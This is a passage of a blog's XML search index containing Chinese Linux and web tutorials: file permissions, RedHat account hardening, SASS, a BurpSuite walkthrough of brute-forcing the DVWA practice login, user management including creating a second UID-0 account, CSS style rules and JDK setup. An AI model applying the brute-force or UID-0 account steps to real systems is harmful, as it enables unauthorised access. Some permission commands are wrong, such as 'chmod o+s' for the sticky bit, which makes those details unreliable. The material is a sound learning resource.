/etc/group chattr -i /etc/gshadow chattr -i /etc/xinetd.conf chattr -i /etc/services]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 学习笔记（七）：文件的特殊权限]]></title>
    <url>%2Farchives%2Fced21d05.html</url>
    <content type="text"><![CDATA[本篇是 Liunx 的学习笔记系列第七篇,在 Liunx 中文件除了 rwx 权限,还存在 SetUID 、 SetGID 、 Sicky BIT 特殊权限,本篇就是来介绍这些特殊权限SetUID针对文件的作用只有可以执行的二进制程序才能设定 SUID 权限命令执行者要对该程序用于 x（执行）权限命令执行者在执行该程序是获得该程序文件属主的身份（在执行程序的过程中灵魂附体成文件的属主）SetUID 权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效概念图设置 SUID只能针对二进制可执行文件4 代表 SUIDCommand Format:chmod 4777 [fileName] # 设置 SUID 权限 chmod 644 [fileName] # 取消 SUID 权限 当然还可以用以下命令设置,Command Format:chmod u+s [fileName] # 设置 SUID 权限 chmod u-s [fileName] # 取消 SUID 权限 S 与 s 的区别大写 S 其实是报错,因为我们用来测试的文件并非二进制文件,或者说是可执行程序,只需添加 x 权限即可变为小写 s,实际上生效的是小写 sFor Examlpe:危险的 SetUID关键目录应严格控制写权限。比如 “/”、”/usr“ 等用户的密码设置要严格遵守密码三原则对系统中默认应该具有 SetUID 权限的文件作一列表,定时检查没有这个之外的文件是否被设置了 SetUID 权限SetGID既可以针对二进制可执行文件,也可以针对目录针对文件的作用只有可以执行的二进制程序才能设定 SGID 权限命令执行者要对该程序用于 x（执行）权限命令执行者在执行该程序的时候,组身份升级为该程序的属组SetUID 权限同样只在该程序执行过程中有效,也就是说组身份改变只在程序执行过成中有效针对目录的作用普通用户必须对此目录拥有 r 和 x 权限,才能进入此目录普通用户在此目录中的有效组会变成此目录的属组若普通用户对此目录拥有 w 权限时,新建的文件的默认属组是这个目录的属组设置 SGID2 代表 SGIDCommand Format:chmod 2777 [fileName] # 设置 SGID 权限 chmod 644 [fileName] # 取消 SGID 权限 当然还可以用以下命令设置,Command Format:chmod g+s [fileName] # 设置 SGID 权限 chmod g-s [fileName] # 取消 SGID 权限 S 与 s 的区别大写 S 其实是报错,因为我们用来测试的文件并非二进制文件,或者说是可执行程序,只需添加 x 权限即可变为小写 sFor Examlpe:Sicky BIT只能针对目录针对目录的作用设置 SBIT粘着位目前对目录有效普通用户对该目录拥有 w 和 x 权限,即普通用户可以在此目录拥有写入权限如果没有粘着位,因为普通用户拥有 w 权限,所以可以删除此目录下所有文件,包括其他用户建立的文件。一但赋予粘着位,除了 root 可以删除所有文件,普通用户就算拥有 w 权限,也只能删除自己建立的文件,但是不能删除其他用户建立的文件1 代表 SBITCommand Format:chmod 1777 [folderName] # 设置 SBIT 权限 chmod 644 [folderName] # 取消 SBIT 权限 当然还可以用以下命令设置,Command Format:chmod o+s [folderName] # 设置 SBIT 权限 chmod o-t [folderName] # 取消 SBIT 权限 举例For Examlpe:]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RedHat 系统安全加固（一）： 帐号安全]]></title>
    <url>%2Farchives%2Fb62bc725.html</url>
    <content type="text"><![CDATA[本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。 本篇主要介绍相关于帐号安全的加固策略, 加强系统的防御能力密码规则密码长度和有效期/etc/login.defs 文件是当创建用户时的一些规划, 比如创建用户时, 是否需要家目录, UID 和 GID 的范围;用户的期限等等, 这个文件是可以通过 root 来定义的Default Configuration:PASS_MAX_DAYS 99999# 两次改变密码之间相距的最大天数, 密码有效最大天数 PASS_MIN_DAYS 0# 两次改变密码之间相距的最小天数, 为零时代表任何时候都可以更改密码 PASS_MIN_LEN 5# 密码最小长度 PASS_WARN_AGE 7# 在密码过期之前警告的天数 注意： 以上只对之后新增的用户有效, 如果要修改已存在的用户密码规则, 需要使用 chage 命令使用以下命令, 可以查看用户的密码规则, Command Format:chage -l [userName] For Examlpe:chage 命令设置最大最小使用天数, 以及警告天数, For Examlpe:chage -M 90 -m 6 -W 30 [userName] 注意： 不要用该命令给 root 用户加上有效期, 如果密码过期, 再加上后文说的 /etc/shadow 文件加锁禁止修改, 会导致 root 提示修改密码, 无法成功修改密码, 从而无法登陆。chage 选项解释-m =&gt; 密码可更改的最小天数。 为零时代表任何时候都可以更改密码。-M =&gt; 密码保持有效的最大天数。-w =&gt; 用户密码到期前, 提前收到警告信息的天数。-E =&gt; 帐号到期的日期。 过了这天, 此帐号将不可用。-d =&gt; 上一次更改的日期。-i =&gt; 停滞时期。 如果一个密码已过期这些天, 那么此帐号将不可用。-l =&gt; 例出当前的设置。 由非特权用户来确定他们的密码或帐号何时过期。如果要修改密码过期时间为 “从不” , For Examlpe:chage -M 99999 [userName] 空密码检查/etc/shadow 文件中的记录行与 /etc/passwd 中的一一对应, 是记录系统中用户的密码的, 此文件只有 root 用户可以对其进行修改使用 awk 命令可以检查是否存在空密码, For Examlpe:awk -F &#39;:&#39; &#39;($2==&quot;&quot;){print $1}&#39; /etc/shadow 没密码检查空密码跟没有密码是俩回事, 体现于 /etc/shadow 中的密码那一列, 空密码是显示空, 没有密码是显示 ！ ！使用 awk 命令可以检查是否存在空密码, For Examlpe:awk -F &#39;:&#39; &#39;($2==&quot;！ ！ &quot;){print $1}&#39; /etc/shadow awk 命令查询 UID 为 0 的用户, For Examlpe:awk -F &#39;:&#39; &#39;($3==0){print $1}&#39; /etc/passwd UID 为 0 的任何用户都拥有系统的最高特权, 保证只有 root 用户的 UID 为 0awk 选项解释-F fs =&gt; fs 指定输入分隔符, fs 可以是字符串或正则表达式, 如 -F:-v var=value =&gt; 赋值一个用户定义变量, 将外部变量传递给 awk-f scripfile =&gt; 从脚本文件中读取 awk 命令-m[fr] val =&gt; 对 val 值设置内在限制, -mf 选项限制分配给 val 的最大块数目;-mr 选项限制记录的最大数目。 这两个功能是 Bell 实验室版 awk 的扩展功能, 在标准 awk 中不适用。密码复杂度redhat 公司专门开发了 cracklib 这个安装包来判断密码的复杂度。检查是否安装了 cracklib 模块rpm -qa | grep cracklib 在 /etc/pam.d/system-auth 中修改password requisite pam_cracklib.so try_first_pass retry = 3 difok = 3 minlen = 8 dcredit = -1 ucredit = -1 lcredit = -1 ocredit = -1 password sufficient pam_unix.so md5 shadow nullok try_first_pass use_authtok remember = 5 参数说明retry=N =&gt; 改变输入密码的次数, 默认值是 1, 一般设置为 3。 就是说, 如果用户输入的密码强度不够可以重复输入的次数。minlen=N =&gt; 密码最小长度（除了 credit 信用度的字符长度以外）dcredit=N =&gt; 密码中至少 (N&lt;0) 或至多 (N&gt;=0) 有几个数字ucredit=N =&gt; 密码中至少 (N&lt;0) 或至多 (N&gt;=0) 有几个大写字母lcredit=N =&gt; 密码中至少 (N&lt;0) 或至多 (N&gt;=0) 有几个小写字母ocredit=N =&gt; 密码中至少 (N&lt;0) 或至多 (N&gt;=0) 有几个特殊字符difok=M =&gt; 新密码与前一个旧密码之间至少有 M 个字符不相同注意： dcredit 、 ucredit 、 lcredit 、 ocredit 为信用度字符, 如果 N&lt;0 , 表示至少, 则新密码长度最小长度就等于 minlen.。 而当 N&gt;0 时, 表示至多, 比如 ocredit=1 , 至多有一个特殊字符, 这样的话, 即使没有特殊字符也会允许设置新密码。 还有, 此时新密码长度会大于 minlen。 算法交复杂, 这里不赘述。 因此, 通常情况下推荐使用 N&lt;0 来做密码复杂度限制。 另外, 此密码规则对 root 用户无效, 只针对普通用户修改自身密码登录验证规则记录普通用户登录失败次数并锁定用户在 `/etc/pam.d/system-auth中“#%PAM-1.0”下面一行加入,For Example:`auth required pam_tally2.so deny = 3 unlock_time = 300 注意： 一定要加在 #%PAM-1.0 下面一行参数说明deny[=n] =&gt; 用户连续错误登陆的最大次数, 超过则锁定unlock_time =&gt; 设定普通用户锁定后, 多少时间后解锁, 单位是秒even_deny_root =&gt; 也限制 root 用户root_unlock_time[=n] =&gt; 设定 root 用户锁定后, 多少时间后解锁, 单位是秒quiet =&gt; 不对已锁定的用户发出提示信息注意： 以上参数根据实际需要取舍, 如果使用了 even_deny_root 参数限制 root 用户登录错误次数, 而没有配置 root_unlock_time 的话, 一旦 root 用户被锁, 解锁将很麻烦。查看用户登录失败次数当登录错误次数达到最大限制后, 用户再次登录时, 会提示Your account is locked.Maximum amount of failed attempts was reached. 通过以下命令可以查看用户登录失败次数, Command Format:pam_tally2 -u [userName] For Example:解锁已经锁定的用户自动解锁如果配置了 unlock_time 或 root_unlock_time (针对 root 用户)参数, 则等待超过这个时长后, 帐户会自动解锁手动解锁：只能以 root 用户通过命令 pam_tally2 -u [userName] -r 可以手动解锁因登录错误次数达到最大限制后自动锁定的用户, 同时登录错误次数会被重置为 0登录超时对于 bash 用户, 修改 /etc/profile 或 /etc/bashrc , 所有使用 bash 的用户都会继承, For Example:对于 csh 用户, 修改 /etc/csh.cshrc , 所有使用 csh 的用户都会继承, For Example:对于 bash 用户, 修改 /etc/profile 或 /etc/bashrc , 所有使用 bash 的用户都会继承, For Example:对于 csh 用户, 修改 /etc/csh.cshrc , 所有使用 csh 的用户都会继承, For Example:访问控制SSH禁止 root 用户远程 ssh 登录由于之前的笔记已经记录过了, 这里就不再重复了ssh 的黑白名单（指定用户或组）由于之前的笔记已经记录过了, 这里就不再重复了ssh 的黑白名单（指定 IP）由于之前的笔记已经记录过了, 这里就不再重复了Telnet禁止 root 用户远程 telnet 登录系统安装 telnet-server 服务后, 默认就是禁止 root 用户直接远程 telnet 登录的。 确认只要存在 /etc/securetty 文件, 就可以限制 root 直接远程 telnet 登录。telnet 的黑白名单（指定用户或组）系统不支持限制普通用户 telnet 远程登录telnet 的黑白名单（指定 IP）与 SSH 中的相差无几, 同样是在 /etc/hosts.allow 里添加白名单, 在 /etc/hosts.deny 里添加黑名单, For Example:in .telnetd: 192.168 .1 .10 192.168 .1 .11# / etc / hosts.allow in .telnetd: ALL# / etc / hosts.deny 禁止普通用户登录 shell使用 usermod 命令修改用户的登录 shell 就好, Command Format:usermod -s /sbin/nologin [userName] 避免普通用户 su 到 root 用户在 `/etc/pam.d/su中“#%PAM-1.0”` 下面一行加入auth sufficient pam_rootok.so debug auth required pam_wheel.so group = wheel 当然只去除红框中的 # 也是 ok 的这样以来只有 wheel 组的用户可以 su 作为 root指定可以 su 到 root 的用户指定某个用户可以 su 到 root 用户, 需要将该用户加入到 wheel 组中usermod -G wheel [username] 注意, 如果禁止 root 用户直接登录, 也不存在 wheel 组的用户, 就无法进入 root 用户了]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SASS 用法指南]]></title>
    <url>%2Farchives%2Fef87912d.html</url>
    <content type="text"><![CDATA[SASS 是 CSS 预处理器之一,它的基本思想是,用一种专门的编程语言,进行网页样式设计,然后再编译成正常的 CSS 文件,它提供了许多便利的写法,大大节省了设计者的时间,使得 CSS 的开发,变得简单和可维护环境布置安装 RubySASS 是 Ruby 语言写的,但是两者的语法没有关系。不懂 Ruby,照样使用。只是必须先安装 Ruby,然后再安装 SASS.在 Ubuntu 下安装 Ruby,For Example:sudo apt-get install ruby 查看版本号,确认 Ruby 环境安装完成ruby -v 安装 SASSRuby 安装好了,之后执行命令gem install sass 查看版本号,确认 SASS 环境安装完成sass -v 使用编译SASS 文件就是普通的文本文件,里面可以直接使用 CSS 语法。文件后缀名是 .scss,意思为 Sassy CSS。下面的命令,可以在屏幕上显示 .scss 文件转化的 .css 代码。（假设文件名为 test。）sass test.scss 编译风格如果要将显示结果保存成文件,后面再跟一个 .css 文件名,For Example:sass test.scss test.css SASS 提供四个编译风格的选项nested =&gt; 嵌套缩进的 css 代码,它是默认值。expanded =&gt; 没有缩进的、扩展的 css 代码。compact =&gt; 简洁格式的 css 代码。compressed =&gt; 压缩后的 css 代码。生产环境当中,一般使用最后一个选项,For Example:sass --style compressed test.sass test.css 你也可以让 SASS 监听某个文件或目录,一旦源文件有变动,就自动生成编译后的版本sass --watch input.scss:output.css # watch a file sass --watch app/sass:public/stylesheets # watch a directory 基本用法变量SASS 允许使用变量,所有变量以 $ 开头。For Example:$blue: #1875e7; div { color: $blue; } 如果变量需要镶嵌在字符串之中,就必须需要写在 #{} 之中。For Example:$side: left; .rounded { border-#{$side}-radius: 5px; } 计算功能SASS 允许在代码中使用算式。For Example:body { margin: (14px/2); top: 50px + 100px; right: $var * 10%; } 嵌套SASS 允许选择器嵌套。比如,下面的 CSS 代码：div h1 { color: red; } 可以写成：div { h1 { color: red; } } 属性也可以嵌套,比如 border-color 属性,可以写成：p { border: { color: red; } } 注意,border 后面必须加上冒号。在嵌套的代码块内,可以使用 &amp; 引用父元素。比如 a:hover 伪类,可以写成：a { &amp;:hover { color: #ffb3ff; } } 注释SASS 共有两种注释风格。标准的 CSS 注释 /* comment */ ,会保留到编译后的文件。 单行注释 // comment,只保留在 SASS 源文件中,编译后被省略。在 /* 后面加一个感叹号,表示这是”重要注释”。即使是压缩模式编译,也会保留这行注释,通常可以用于声明版权信息。/*! * 重要注释！ */ 代码的重用继承SASS 允许一个选择器,继承另一个选择器。比如,现有 class1：.class1 { border: 1px solid #ddd; } class2 要继承 class1,就要使用 @extend 命令：.class2 { @extend .class1; font-size: 120%; } MixinMixin 有点像 C 语言的宏（macro）,是可以重用的代码块。 使用 @mixin 命令,定义一个代码块。@mixin left { float: left; margin-left: 10px; } 使用 @include 命令,调用这个 mixin。div { @include left; } mixin 的强大之处,在于可以指定参数和缺省值。@mixin left($value: 10px) { float: left; margin-right: $value; } 使用的时候,根据需要加入参数：div { @include left(20px); } 下面是一个 mixin 的实例,用来生成浏览器前缀。@mixin rounded($vert, $horz, $radius: 10px) { border-#{$vert}-#{$horz}-radius: $radius; -moz-border-radius-#{$vert}#{$horz}: $radius; -webkit-border-#{$vert}-#{$horz}-radius: $radius; } 使用的时候,可以像下面这样调用：#navbar li { @include rounded(top, left); } #footer { @include rounded(top, left, 5px); } 颜色函数SASS 提供了一些内置的颜色函数,以便生成系列颜色。lighten(#cc3, 10%) // #d6d65c darken(#cc3, 10%) // #a3a329 grayscale(#cc3) // #808080 complement(#cc3) // #33c 插入文件@import 命令,用来插入外部文件。@import &quot;path/filename.scss&quot;; 如果插入的是 .css 文件,则等同于 css 的 import 命令。@import &quot;foo.css&quot;; 高级用法条件语句@if 可以用来判断：p { @if 1 + 1 == 2 { border: 1px solid; } @if 5 &lt; 3 { border: 2px dotted; } } 配套的还有 @else 命令：@if lightness($color) &gt; 30% { background-color: #000; } @else { background-color: #fff; } 循环语句SASS 支持 for 循环：@for $i from 1 to 10 { .border-#{$i} { border: #{$i}px solid blue; } } 也支持 while 循环：$i: 6; @while $i &gt; 0 { .item-#{$i} { width: 2em * $i; } $i: $i - 2; } each 命令,作用与 for 类似：@each $member in a, b, c, d { .#{$member} { background-image: url(&quot;/image/#{$member}.jpg&quot;); } } 自定义函数SASS 允许用户编写自市场上市己的函数。@function double($n) { @return $n * 2; } #sidebar { width: double(5px); }]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透工具用法（二）：BurpSuite 的用法]]></title>
    <url>%2Farchives%2F6686ada6.html</url>
    <content type="text"><![CDATA[此系列笔记是网络渗透工具的使用方法,本篇是介绍 Web 应用程序测试工具 BurpSuite 的使用方法。Burp Suite 其多种功能可以帮我们执行各种任务,请求的拦截和修改,扫描 web 应用程序漏洞,以暴力破解登陆表单,执行会话令牌等多种的随机性检查Burp Suite 环境kali Liunx里已经集成了 Burp Suite 工具,windows 下安装 Burp Suite 之前请确定你的电脑里有 Java 环境Burp Suite 官网下载地址JDK 安装和环境变量配置windows 下安装 Burp Suite 需要 Java 环境进行支持,由于本博客之前是有写过 JDK 的安装和环境变量的配置,所以这里不再提供。设置代理Burp Suite 带有一个代理,通过默认端口 8080 上运行,使用这个代理,我们可以截获并修改从客户端到 web 应用程序的数据包。这里我们使用 Chrome 浏览器,在 Chrome 浏览器里也需要设置代理方式拦截改包和暴力破解模拟登录这里使用漏洞集成平台 DVWA 来进行测试拦截请求包随意输入密码（这里填写的密码为 123）,点击登录,在 Burp Suite 里就可以看到拦截的请求包（前提是设置好代理）修改请求包将拦截到的数据包 Send to Intruder（也可以使用 Ctrl+I）在 Position 选项中设置需要破解的变量。Burpsuite 会自动设置许多变量,单击 Clear 按钮,把默认变量全部清除,然后选中密码 123,单击 Add 按钮将之设为需要破解的变量。由于只有一个变量,因而 Attack type 攻击类型这里选择 Sniper。添加字典在 Payloads 选项中进行设置,由于只有一个变量,因而 Payload set 自动设置为 1,Payload type 这里设置为 Simple list。在下面的 Payload Options 中,我们添加可能的密码,或者密码。开始破解在菜单栏中选择 Intruder/Start attack,就可以开始暴力破解。分析在 Results 中,双击 length 进行排序,在这里所有登录成功或者登录失败的记录全部在这里。选中请求字节包最大的,在 Response/Render 里就可以看到 Welcome to the password protected area admin 成功登录的信息Decode 和 EncodeDecoder 转化成规范的形式编码数据,或转化成各种形式编码和散列的原始数据。它能够智能识别多种编码格式,使用启发式技术。下面这张图是将一段 URL 进行 encode（编码）]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 学习笔记（六）：用户的管理]]></title>
    <url>%2Farchives%2Fc00a7200.html</url>
    <content type="text"><![CDATA[本篇是 Liunx 的学习笔记系列第五篇,这一篇将介绍 Liunx 下用户的管理。用户管理看似很简单,但是里面还隐藏着大学问呢添加用户,并创建用户宿主目录For Example:useradd -m [userName] 删除用户,并删除用户宿主目录For Example:userdel -r [userName] 添加 uid 为 0 的用户For Example:useradd -u 0 -o [userName] 查看用户的 uid 或 gid 等信息For Example:id [userName] 为用户添加密码For Example:passwd [userName] # 普通方法 echo &quot;passwd string&quot; | passwd --stdin [userName] # 输出文本内容作为密码 普通用户修改密码命令： passwd查看用户的密码状态For Example:passwd -S [userName] # 普通方法 cat /etc/passwd | grep [userName] # 查看配置文件 禁用和解锁用户passwd 方法For Example:passwd -l [userName] # 禁用 passwd -u [userName] # 解锁 修改 /etc/shadow 文件（root 用户）For Example:vim /etc/shadow 禁用则在密码位前手工添加 ! （启用删除 ! 即可）test:!$1$afiVSYfG$utdc2qWLNrqNcy63Ca8301:16998:0:99999:7::: # 只加一个 ！ test:!!$1$afiVSYfG$utdc2qWLNrqNcy63Ca8301:16998:0:99999:7::: # 加两个,效果一致 使用 :wq! 强制保存,因为其权限为 000usermod 方法For Example:usermod -L [userName] # 禁用 usermod -U [userName] # 解锁 设置用户一登录就要修改密码For Example:chage -d 0 [userName] # 这个命令其实是把密码修改日期归 0 了 （/etc/shadow 文件第 3 个字段） 查看当前登录的用户是谁For Example:whoami 查看当前登录的用户的环境变量For Example:env 切换用户For Example:su - [userName]]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML 和 CSS 代码规范]]></title>
    <url>%2Farchives%2Fa7ff1bf6.html</url>
    <content type="text"><![CDATA[介绍 HTML 和 CSS 的格式和代码规范,旨在提高代码质量和协作效率通用样式规范协议省略图片、样式、脚本以及其他媒体文件 URL 的协议部分（ http:,https: ）,除非文件在两种协议下都不可用。这种方案称为 protocol-relative URL,好处是无论你是使用 HTTPS 还是 HTTP 访问页面,浏览器都会以相同的协议请求页面中的资源,同时可以节省一部分字节。For Example:&lt;!-- Low--&gt; &lt;script src=&quot;https://www.google.com/js/gweb/analytics/autotrack.js&quot;&gt;&lt;/script&gt; &lt;!-- Good --&gt; &lt;script src=&quot;//www.google.com/js/gweb/analytics/autotrack.js&quot;&gt;&lt;/script&gt; /* Low */ .example { background: url(&quot;https://www.google.com/images/exampl&quot;e); } /* Good */ .example { background: url(&quot;//www.google.com/images/example&quot;); } 通用格式规范缩进一次缩进 2 个空格,不要使用 tab 或者混合 tab 和空格的缩进。For Example:&lt;ul&gt; &lt;li&gt;Fantastic &lt;li&gt;Great &lt;/ul&gt; .example { color: blue; } 大小写以下都应该用小写：HTML 元素名称,属性,属性值（除非 text/CDATA）,CSS 选择器,属性,属性值。For Example:&lt;!-- Low --&gt; &lt;A HREF=&quot;/&quot;&gt;Home&lt;/A&gt; &lt;!-- Good --&gt; &lt;img src=&quot;google.png&quot; alt=&quot;Google&quot;&gt; /* Low */ .example { color: #e5e5e5; } /* Good */ .example { color: #e5e5e5; } 结尾空格结尾空格不仅多余,而且在比较代码时会更麻烦。For Example:&lt;!-- Low --&gt; &lt;p&gt;What?&lt;p&gt; &lt;!-- Good --&gt; &lt;p&gt;Yes please.&lt;/p&gt; 通用元规范编码在 HTML 中通过 &lt;meta charset=&quot;utf-8&quot;&gt; 指定编码方式,CSS 中不需要指定,因为默认是 UTF-8。注释使用注释来解释代码：包含的模块,功能以及优点。任务项用 TODO 来标记待办事项,而不是用一些其他的标记,像 @@。For Example:&lt;!-- TODO: remove optional tags --&gt; &lt;ul&gt; &lt;li&gt;Apples&lt;/li&gt; &lt;li&gt;Oranges&lt;/li&gt; &lt;/ul&gt; HTML 风格规范文档类型HTML 文档应使用 HTML5 的文档类型：&lt;!DOCTYPE html&gt;。孤立标签无需封闭自身,如：&lt;br&gt; 不要写成 &lt;br /&gt;。HTML 正确性尽可能使用正确的 HTML。For Example:&lt;!-- Low --&gt; &lt;title&gt;Test&lt;/title&gt; &lt;article&gt;This is only a test. &lt;!-- Good --&gt; &lt;!DOCTYPE html&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Test&lt;/title&gt; &lt;article&gt;This is only a test.&lt;/article&gt; 语义化根据使用场景选择正确的 HTML 元素（有时被错误的称为”标签”）。例如,使用 h1 元素创建标题,p 元素创建段落,a 元素创建链接等等。正确的使用 HTML 元素对于可访问性、可重用性以及编码效率都很重要。For Example:&lt;!-- Low --&gt; &lt;div onclick=&quot;goToRecommendations();&quot;&gt;All recommendations&lt;/div&gt; &lt;!-- Good --&gt; &lt;a href=&quot;recommendations/&quot;&gt;All recommendations&lt;/a&gt; 多媒体元素降级对于像图片、视频、canvas 动画等多媒体元素,确保提供其他可访问的内容。图片可以使用替代文本（alt）,视频和音频可以使用文字版本。For Example:&lt;!-- Low --&gt; &lt;img src=&quot;spreadsheet.png&quot;&gt; &lt;!-- Good --&gt; &lt;img src=&quot;spreadsheet.png&quot; alt=&quot;Spreadsheet screenshot.&quot;&gt; 关注分离标记、样式和脚本分离,确保相互耦合最小化。实体引用如果团队中文件和编辑器使用同样的编码方式,就没必要使用实体引用,除了一些在 HTML 中有特殊含义的字符（如 &lt; 和 &amp;）以及不可见的字符（如空格）。For Example:&lt;!-- Low --&gt; The currency symbol for the Euro is “&amp;eur;”. &lt;!-- Good --&gt; The currency symbol for the Euro is “€”. type 属性在引用样式表和脚本时,不要指定 type 属性,除非不是 CSS 或 JavaScript。因为 HTML5 中已经默认指定样式变的 type 是 text/css,脚本的 type 是 text/javascript。For Example:&lt;!-- Low --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://www.google.com/css/maia.css&quot; type=&quot;text/css&quot;&gt; &lt;!-- Good --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;//www.google.com/css/maia.css&quot;&gt; &lt;!-- Low --&gt; &lt;script src=&quot;https://www.google.com/js/gweb/analytics/autotrack.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt; &lt;!-- Good --&gt; &lt;script src=&quot;//www.google.com/js/gweb/analytics/autotrack.js&quot;&gt;&lt;/script&gt; HTML 格式规范HTML 引号属性值用双引号。 For Example:&lt;!-- Low --&gt; &lt;a class=&#39;maia-button maia-button-secondary&#39;&gt;Sign in&lt;/a&gt; &lt;!-- Good --&gt; &lt;a class=&quot;maia-button maia-button-secondary&quot;&gt;Sign in&lt;/a&gt; CSS 风格规范ID 和 Class 命名使用有含义的 id 和 class 名称。 For Example:/* Low: 毫无意义 */ #yee-1901 { } /* Low: 表述直觉 */ .button-green { } .clear { } /* Good: 具体的 */ #gallery { } #login { } .video { } /* Good: 通用的 */ .aux { } .alt { } ID 和 Class 命名风格id 和 class 应该尽量简短,同时要容易理解。For Example:/* Low */ #navigation { } .atr { } /* Good */ #nav { } .author { } 选择器除非需要,否则不要在 id 或 class 前加元素名。For Example:/* Low */ ul#example { } div.error { } /* Good */ #example { } .error { } 属性简写尽量使用 CSS 中可以简写的属性 (如 font),可以提高编码效率以及代码可读性。For Example:/* Low */ .example { border-top-style: none; font-family: palatino, georgia, serif; font-size: 100%; line-height: 1.6; padding-bottom: 2em; padding-left: 1em; padding-right: 1em; padding-top: 0; } /* Good */ .example { border-top: 0; font: 100%/1.6 palatino, georgia, serif; padding: 0 1em 2em; } 0 和单位值为 0 时不用添加单位。For Example:.example { margin: 0; padding: 0; } 开头的 0值在 -1 和 1 之间时,不需要加 0。For Example:.example { font-size: 0.8em; } 16 进制表示法For Example:/* Low */ .example { color: #eebbcc; } /* Good */ .example { color: #ebc; } 前缀使用带前缀的命名空间可以防止命名冲突,同时提高代码可维护性。 For Example:.adw-help { } /* AdWords */ #maia-note { } /* Maia */ 选择器中使用连字符可以提高可读性。For Example:/* Low: does not separate the words “demo” and “image” */ .demoimage { } /* Low: uses underscore instead of hyphen */ .error_status { } /* Good */ #video-id { } .ads-sample { } CSS 格式规范CSS 书写顺序位置属性 {position, top, right, z-index, display, float 等}大小 {width, height, padding, margin 等}文字系列 {font, line-height, letter-spacing,color,text-align 等}背景 {background,border 等}其他 {animation, transition 等}For Example:/* Low */ .example { color: red; z-index: -1; background-color: #9e0; display: inline-block; font-size: 1.5em; } /* Good */ .example { z-index: -1; display: inline-block; font-size: 1.5em; color: red; background-color: #9e0; } 块级内容缩进为了反映层级关系和提高可读性,块级内容都应缩进。For Example:@media screen, projection { html { background: #fff; color: #444; } } 声明结束每行 CSS 都应以分号结尾。For Example:/* Low */ .test { display: block; height: 100px; } /* Good */ .test { display: block; height: 100px; } 属性名结尾属性名和值之间都应有一个空格。For Example:/* Low */ h3 { font-weight: bold; } /* Good */ h3 { font-weight: bold; } 声明样式块的分隔在选择器和 {} 之间用空格隔开。For Example:/* Low: missing space */ #video { margin-top: 1em; } /* Low: unnecessary line break */ #video { margin-top: 1em; } /* Good */ #video { margin-top: 1em; } 选择器分隔每个选择器都另起一行。For Example:/* Low */ a:focus, a:active { position: relative; top: 1px; } /* Good */ h1, h2, h3 { font-weight: normal; line-height: 1.2; } 规则分隔规则之间都用空行隔开。For Example:html { background: #fff; } body { margin: auto; width: 50%; } CSS 引号属性选择器和属性值用单引号,URI 的值不需要引号。For Example:/* Low */ @import url(&quot;https://www.google.com/css/maia.css&quot;); html { font-family: &quot;open sans&quot;, arial, sans-serif; } /* Good */ @import url(&quot;//www.google.com/css/maia.css&quot;); html { font-family: &quot;open sans&quot;, arial, sans-serif; } CSS 元规则分段注释用注释把 CSS 分成各个部分。For Example:/* Header */ #adw-header { } /* Footer */ #adw-footer { } /* Gallery */ .adw-gallery { }]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>Criterion</tag>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JDK 的安装和环境变量的配置]]></title>
    <url>%2Farchives%2Fb76beaef.html</url>
    <content type="text"><![CDATA[JDK 是 Java 语言的软件开发工具包,主要用于移动设备、嵌入式设备上的 java 应用程序。JDK 是整个 java 开发的核心,它包含了 JAVA 的运行环境,JAVA 工具和 JAVA 基础的类库。这里将介绍在 Windows 下 JDK 的安装和环境变量的配置安装 JDK安装 JDK 时。第一次是安装 jdk ,第二次是安装 jre 。建议两个都安装在同一个 java 文件夹中的不同文件夹中。（不能都安装在 java 文件夹的根目录下,jdk 和 jre 安装在同一文件夹会出错）。For Example:安装 jdk 随意选择目录 只需把默认安装目录 \java 之前的目录修改即可安装 jre → 更改 → \java 之前目录和安装 jdk 目录相同即可注：若无安装目录要求,可全默认设置。无需做任何修改,两次均直接点下一步。环境变量配置安装完 JDK 后配置环境变量,依次选择：计算机 → 属性 → 高级系统设置 → 高级 → 环境变量指定 JAVA 程序目录新建 JAVA_HOME 变量 。变量值填写 jdk 的安装目录（本人是 D:\Java\jdk)修改 Path 变量在变量值最后输入 %JAVA_HOME%\bin;%JAVA_HOME%\jre\bin; （注意原来 Path 的变量值末尾有没有 ; 号,如果没有,先输入 ; 号再输入上面的代码）新建 CLASSPATH 变量在变量值中输入 .;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar （注意最前面有一点）到此系统的环境变量已经全部配置完毕。检验安装完成运行 cmd 输入 java -version （java 和 -version 之间有空格）。 若如图所示,显示版本信息,则说明安装和配置成功。附加 liunx 下环境变量配置安装包只需在官网下载源码安装包即可,下载之后解压在 ~/java/jdk 下即可在 /etc/profile 和 /etc/bash.bashrc 下粘贴以下代码export JAVA_HOME=~/java/jdk export PATH=$JAVA_HOME/bin:$PATH export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export JRE_HOME=$JAVA_HOME 之后分别运行 source /etc/profile 、source /etc/bash.bashrc 来让配置生效生效之后可以运行 java -version 来验证一下]]></content>
